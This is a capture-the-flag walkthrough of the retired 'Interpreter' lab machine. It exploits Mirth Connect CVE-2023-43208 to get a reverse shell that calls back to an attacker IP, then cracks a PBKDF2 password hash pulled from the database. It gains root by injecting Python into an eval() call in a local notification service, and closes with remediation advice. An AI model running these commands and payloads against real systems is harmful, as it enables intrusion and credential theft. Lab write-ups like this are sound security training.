| Property         | Value                                              |
| ---------------- | -------------------------------------------------- |
| **OS**           | Linux                                              |
| **Difficulty**   | Medium                                             |
| **Release Date** | 2026-02-21                                         |
| **State**        | Retired                                            |
| **IP**           | 10.129.73.59                                       |
| **Techniques**   | Unauthenticated RCE, hash cracking, code injection |
| **Tags**         | #web #privesc #linux #python                       |

---
## Summary

Interpreter is a medium Linux machine hosting a Mirth Connect instance on ports 80 and 443. Downloading the `webstart.jnlp` file from the main page shows that Mirth Connect is running version 4.4.0, which is vulnerable to unauthenticated RCE (CVE-2023-43208). The vulnerability is leveraged to gain initial access as the `mirth` user. The Mirth Connect configuration file `mirth.properties` contains credentials for a local MySQL database. Enumerating the database reveals a second user, `sedric`, along with a PBKDF2-HMAC-SHA256 password hash stored as a Base64 encoded blob. Consulting the Mirth Connect source code identifies the encoding scheme, enabling the blob to be split into its salt and digest components and cracked with hashcat, granting SSH access as `sedric`. Privilege escalation is achieved by exploiting an unsanitized `eval()` call in a Python notification server running as root on an internal port, allowing arbitrary code execution which can be used to successfully read the root flag.

---
## Enumeration

```
echo '10.129.73.59 interpreter.htb' | sudo tee -a /etc/hosts
```

Added the IP address of the machine to the `/etc/hosts` file.

### Nmap Scan

```
sudo nmap -sV -sC interpreter.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-19 14:50 EDT
Nmap scan report for interpreter.htb (10.129.73.59)
Host is up (0.033s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp  open  http     Jetty
|_http-title: Mirth Connect Administrator
443/tcp open  ssl/http Jetty
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
|_http-title: Mirth Connect Administrator
| http-methods:
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 17.59 seconds

sudo nmap -p- interpreter.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-19 14:50 EDT
Nmap scan report for interpreter.htb (10.129.73.59)
Host is up (0.029s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
6661/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.89 seconds
```

### Service Enumeration

The service running on port 6661 was accessible but returned no banner or command prompt.

``` 
nc -nv 10.129.73.59 6661 
(UNKNOWN) [10.129.73.59] 6661 (?) open 
```

The service on port 80 is a Mirth Connect instance. Mirth Connect is a cross-platform healthcare interface engine used for bidirectional message routing and transformation, primarily in clinical environments.

![](./screens/1.png)

**Vulnerable Mirth Connect version 4.4.0:**

Clicking "Launch Mirth Connect Administrator" downloads `webstart.jnlp`, which explicitly declares the running version:

```xml
<jnlp codebase="http://interpreter.htb:80" version="4.4.0">
    <information>
        <title>Mirth Connect Administrator 4.4.0</title>
        ...
    </information>
    ...
    <application-desc main-class="com.mirth.connect.client.ui.Mirth">
        <argument>https://interpreter.htb:443</argument>
        <argument>4.4.0</argument>
    </application-desc>
</jnlp>
```

Version 4.4.0 is vulnerable to CVE-2023-43208, an unauthenticated RCE.

---
## Foothold

### CVE-2023-43208

Mirth Connect mishandles deserialized data in a way that allows an unauthenticated attacker to execute arbitrary OS commands via a crafted HTTP request. The original vulnerability (CVE-2023-37679), discovered by IHTeam, was only partially patched. Researchers at Horizon3.ai subsequently identified a gadget chain that bypassed the deny list introduced in that patch, leading to the assignment of CVE-2023-43208. The vulnerability was fully addressed in Mirth Connect version 4.4.1.

### Exploitation

PoC: [github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT)


```shell
python3 CVE-2023-43208.py -u https://interpreter.htb:443 -lh 10.10.14.224 -lp 2222
```

A reverse shell is obtained as the `mirth` user:

```
nc -lvnp 2222
listening on [any] 2222 ...
connect to [10.10.14.224] from (UNKNOWN) [10.129.73.59] 51882
python3 -c 'import pty; pty.spawn("/bin/bash")'
mirth@interpreter:/usr/local/mirthconnect$
```

### Configuration File Enumeration

Mirth Connect stores its main configuration in `mirth.properties`, which defines the application data directory, listening ports, and the database backend. Inspecting it reveals plaintext credentials for the local MySQL database:

```
mirth@interpreter:/usr/local/mirthconnect/conf$ cat mirth.properties
...
database = mysql
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = MirthPass123!
...
```

Database credentials recovered: `mirthdb:MirthPass123!`

---
## Lateral Movement

Connecting to the database with the recovered credentials:

```
mirth@interpreter:/usr/local/mirthconnect/conf$ mysql -u mirthdb -pMirthPass123! -h 127.0.0.1 mc_bdd_prod
```

Enumerating the `PERSON` and `PERSON_PASSWORD` tables discloses a second user and his stored password hash:

```
MariaDB [mc_bdd_prod]> select * from PERSON;
+----+----------+...
|  2 | sedric   |...
+----+----------+...

MariaDB [mc_bdd_prod]> select * from PERSON_PASSWORD;
+-----------+----------------------------------------------------------+---------------------+
| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
+-----------+----------------------------------------------------------+---------------------+
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
+-----------+----------------------------------------------------------+---------------------+
```

### Mirth Connect 4.4.0 Password Hashing

Mirth Connect 4.4.0 upgraded its password storage to comply with modern security standards, adopting PBKDF2WithHmacSHA256 with 600,000 iterations, the NIST-recommended minimum at the time of the release, as documented in the official [4.4.0 Upgrade Guide](https://github.com/nextgenhealthcare/connect/wiki/4.4.0---Upgrade-Guide).

Reviewing the `Digester.java` source class reveals the storage format: an 8-byte random salt is generated, a 32-byte digest is derived via PBKDF2, and the two are concatenated as `salt || digest` using `ArrayUtils.addAll(salt, digestBytes)` before being Base64-encoded into a single string. Since `mirth.properties` contains no overrides for any digest parameters, the 4.4.0 defaults apply in full:

|Parameter|Value|
|---|---|
|Algorithm|PBKDF2WithHmacSHA256|
|Iterations|600,000|
|Salt length|8 bytes|
|Key length|256 bits (32 bytes)|

Decoding the blob yields 40 bytes total (8 salt + 32 digest).

### Decoding the Hash

Hashcat's PBKDF2-HMAC-SHA256 mode (`-m 10900`) expects the salt and digest as separate Base64 encoded fields. The database stores them as a single concatenated string, they must be decoded and encoded back individually before the hash can be submitted to Hashcat.

This can be achieved using the following custom script:

```python
import base64
data = base64.b64decode("u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==")
salt = base64.b64encode(data[:8]).decode()
digest = base64.b64encode(data[8:]).decode()
print(f"sha256:600000:{salt}:{digest}")
```

The whole string is converted into 40 raw bytes. The salt (first 8 bytes) and the digest (remaining 32 bytes) get split, decoded from raw bytes to text and encoded again in Base64, allowing hashcat to successfully interpret the string.

```
 python3 mirth-connect-decode.py           
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

### Cracking the Hash

```
hashcat -m 10900 sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps= /usr/share/wordlists/rockyou.txt

sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1

Status...: Cracked
Time.....: 4 mins, 40 secs
Speed....: 36 H/s
```

Credentials recovered: `sedric:snowflake1`

## User Flag

```
ssh sedric@interpreter.htb
# password: snowflake1

sedric@interpreter:~$ cat user.txt
89d4************************bd5
```

---
## Privilege Escalation

### Enumeration

Running linpeas discloses a Python script owned by root but readable by `sedric`:

```
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root sedric 33 May 19 14:49 /home/sedric/user.txt
-rwxr----- 1 root sedric 2332 Sep 19  2025 /usr/local/bin/notif.py
```

```python
#!/usr/bin/env python3
"""
Notification server for added patients.
Listens for XML messages containing patient information and writes formatted
notifications to /var/secure-health/patients/.
"""
from flask import Flask, request, abort
import re, uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")   # <-- vulnerable
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    ...
    notification = template(...)
    ...

if __name__=="__main__":
    app.run("127.0.0.1", 54321, threaded=True)
```

**Code injection vulnerability:**

The `template()` function validates each input field against a character allowlist, then embeds the values directly into an f-string that is passed to `eval()`. Python's f-string syntax allows arbitrary expressions inside `{}` braces, and the allowlist permits both `{` and `}`. This means a field value such as `{open('/root/root.txt').read()}` passes validation and is evaluated as executable Python code when `eval()` processes the template string.

Port enumeration confirms the service is bound exclusively to localhost on port 54321:

```
sedric@interpreter:~$ ss -tlpn
LISTEN  0  128  127.0.0.1:54321  0.0.0.0:*
```

### Exploitation

Since the `curl` binary is not available on the target, an SSH local port forward is used to reach the internal service from the attacker machine:

```shell
ssh -L 1234:localhost:54321 sedric@interpreter.htb
```

## Root flag

The root flag is read by injecting a Python expression into the `gender` field, which passes the allowlist check and is executed by `eval()`:

```shell
curl -s http://localhost:1234/addPatient \
-H "Content-Type: application/xml" \
-d "<patient>
<firstname>a</firstname>
<lastname>b</lastname>
<sender_app>test</sender_app>
<timestamp>1</timestamp>
<birth_date>10/10/1926</birth_date>
<gender>{open('/root/root.txt').read()}</gender>
</patient>"
Patient a b (f83f************************fbc
), 100 years old, received from test at 1
```

---
## Remediation

- **CVE-2023-43208:** Upgrade Mirth Connect to version 4.4.1 or later.
- **Plaintext database credentials:** Restrict read permissions on `mirth.properties`.
- **Weak credentials:** While the hashing algorithm is relatively secure, passwords in common wordlists will still crack given sufficient time. Enforce a strong password policy for application accounts.
- **`eval()` code injection:** Remove the use of `eval()`. For simple age calculation and string formatting, use standard Python string formatting with explicit variable substitution, since no dynamic evaluation is needed. If f-string templating is required, ensure that `{` and `}` are stripped from all user-controlled input before it enters the template.

---
## References

- [CVE-2023-43208 PoC](https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT)
- [Mirth Connect 4.4.0 Upgrade Guide — Password Hashing](https://github.com/nextgenhealthcare/connect/wiki/4.4.0---Upgrade-Guide)
- [Digester.java — Mirth Connect Source](https://github.com/nextgenhealthcare/connect/blob/be90435c57f2f0e93f1aa612f5afc4bf52717e01/core-util/test/com/mirth/commons/encryption/test/DigesterTest.java#L17)
- [eval() —  Code Injection](https://semgrep.dev/docs/cheat-sheets/python-code-injection)